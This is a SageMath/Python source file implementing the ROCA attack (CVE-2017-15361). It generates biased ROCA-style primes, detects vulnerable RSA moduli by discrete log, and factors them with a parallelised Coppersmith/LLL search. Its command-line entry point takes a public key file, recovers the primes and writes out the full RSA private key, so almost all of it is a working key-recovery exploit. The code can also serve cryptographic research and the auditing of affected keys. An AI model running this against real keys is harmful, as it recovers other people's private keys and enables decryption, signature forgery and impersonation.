N_TABLE = {
    range(512, 960+1): 39,
    range(992, 1952+1): 71,
    range(1984, 3936+1): 126,
    range(3968, 4069+1): 225
}


def gen_M(bit_size):
    for r in N_TABLE:
        if bit_size in r:
            n = N_TABLE[r]

    p = 0
    M = 1
    for _ in range(n):
        p = next_prime(p)
        M *= p
    
    return M


# LSB bias
def add_parity_bias(a):
    lsb = randint(0, 99) > 89
    if a & 1 == lsb:
        return a
    else:
        return a ^^ 1


def gen_roca_prime(bit_size: int):
    M      = gen_M(bit_size*2)
    M_size = int(M).bit_length()
    p      = 4
    k_size = bit_size-M_size-1

    # Here we're manually adding the MSB bias
    Mp, _, _, c_a = get_params(bit_size*2)
    Zm     = ZZ.quo(Mp)
    max_a  = int(Zm(65537).multiplicative_order())

    while not is_prime(p):
        k = randint(2**k_size+1 , 2**(k_size+1))
        a = randint(c_a, max_a)
        a = add_parity_bias(a)
        p = k*M + int(pow(65537, a, M))

    return p, k, a, M



def get_a_k(p, Mp):
    Zm = ZZ.quo(Mp)
    e_a = p % Mp
    a = discrete_log(e_a, Zm(65537))
    return a, (p - e_a) // Mp


def collect_params(num, bit_size):
    Mp, _, _, _ = get_params(bit_size)
    all_params = []
    for _ in range(num):
        p, k, a, M = gen_roca_prime(bit_size // 2)
        ap, kp = get_a_k(p, Mp)
        all_params.append((a, k, ap, kp))
    
    return all_params


# "Optimization of the ROCA (CVE-2017-15361) Attack"
M_PRIME_TABLE = {
    512:  (0x1b3e6c9433a7735fa5fc479ffe4027e13bea, 5, 6, 0x80000),
    1024: (0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e, 4, 5, 0x40000000),
    2048: (0x016928dc3e47b44daf289a60e80e1fc6bd7648d7ef60d1890f3e0a9455efe0abdb7a748131413cebd2e36a76a355c1b664be462e115ac330f9c13344f8f3d1034a02c23396e6, 7, 8, 0x400000000)
}

def get_params(bit_size):
    if bit_size < 992:
        return M_PRIME_TABLE[512]
    elif bit_size < 1984:
        return M_PRIME_TABLE[1024]
    else:
        return M_PRIME_TABLE[2048]


def check_roca(N):
    Mp, m, t, _ = get_params(int(N).bit_length())
    try:
        Zm = ZZ.quo(Mp)
        g  = Zm(65537)
        cp = discrete_log(Zm(N), g)
        return True
    except ValueError:
        return False




def coppersmith(fn, beta, m, t, X):
    N = fn.parent().characteristic()

    if not fn.is_monic():
        raise ArithmeticError("Polynomial must be monic.")

    beta = RR(beta)
    if beta <= 0.0 or beta > 1.0:
        raise ValueError("0.0 < beta <= 1.0 not satisfied.")

    f = fn.change_ring(ZZ)

    P,(x,) = f.parent().objgens()

    delta = f.degree()

    # we could do this much faster, but this is a cheap step
    # compared to LLL
    g  = [x**j * N**(m-i) * f**i for i in range(m) for j in range(delta) ]
    g.extend([x**i * f**m for i in range(t)]) # h

    B = Matrix(ZZ, len(g), delta*m + max(delta,t) )
    for i in range(B.nrows()):
        for j in range( g[i].degree()+1 ):
            B[i,j] = g[i][j]*X**j

    B =  B.LLL()

    f = sum([ZZ(B[0,i]//X**i)*x**i for i in range(B.ncols())])
    R = f.roots()

    ZmodN = fn.base_ring()
    roots = set([ZmodN(r) for r,m in R if abs(r) <= X])
    Nbeta = N**beta
    return [root for root in roots if N.gcd(ZZ(fn(root))) >= Nbeta]


def roca(N):
    Mp, m, t, c_a = get_params(int(N).bit_length())
    Zm = ZZ.quo(Mp)
    Zn = ZZ.quo(N)
    R.<x> = Zn[]

    g     = Zm(65537)
    cp    = discrete_log(Zm(N), g)
    ord_p = g.multiplicative_order()
    inv_M = int(~Zn(Mp))

    # This should be (cp + ord_p) // 2, but `a_prime` is
    # bigger sometimes (?)
    end   = cp//2 + ord_p
    #end   = (cp + ord_p) // 2
    #start = cp//2

    # 4.1 Fixed Bits in Exponent `a` and `k`
    # `a`'s MSB is 1; therefore we only need to check half the range
    start = c_a
    cpus  = sage.parallel.ncpus.ncpus()
    chunk_size = ceil((end - start) / cpus)

    B = 0.5
    X = (2*N^B / Mp).ceil()

    @parallel
    def attempt_chunk(r):
        # 4.2 Biases in exponent `a_prime`
        # LSB is even 90% of time; try even numbers first!
        for parity in [0, 1]:
            for ap in r:
                if ap % 2 != parity:
                    continue

                gap = int(g**ap)
                f = x + inv_M * gap
                kp = coppersmith(f, B, m, t, X)
                if kp:
                    p = int(kp[0])*Mp + gap

                    if not N % p:
                        return p


    chunks = []
    for chunk in range(ceil((end - start) / chunk_size)):
        mod  = chunk*chunk_size
        vals = range(start+mod, start+mod+chunk_size)
        chunks.append(vals)


    for res in attempt_chunk(chunks):
        if res[1]:
            p = res[1]
            return p, N // p



if __name__ == '__main__':
    from samson.public_key.rsa import RSA
    import warnings
    warnings.filterwarnings("ignore", category=DeprecationWarning)

    import sys

    with open(sys.argv[1], 'br') as f:
        key = f.read()


    rsa = RSA.import_key(key)
    n   = int(rsa.key.n)
    if not check_roca(n):
        print("[-] Provided RSA key is not vulnerable to ROCA")
        sys.exit(1)
    
    print('[+] Vulnerable key detected!')
    p, q = roca(ZZ(n))
    print(f'[+] Factorization complete: N = {p} * {q}')
    print(f'[+] Wrote private key to: {sys.argv[2]}')

    with open(sys.argv[2], 'w+') as f:
        f.write(RSA(p=int(p), q=int(q), e=int(65537)).export_private_key().decode())
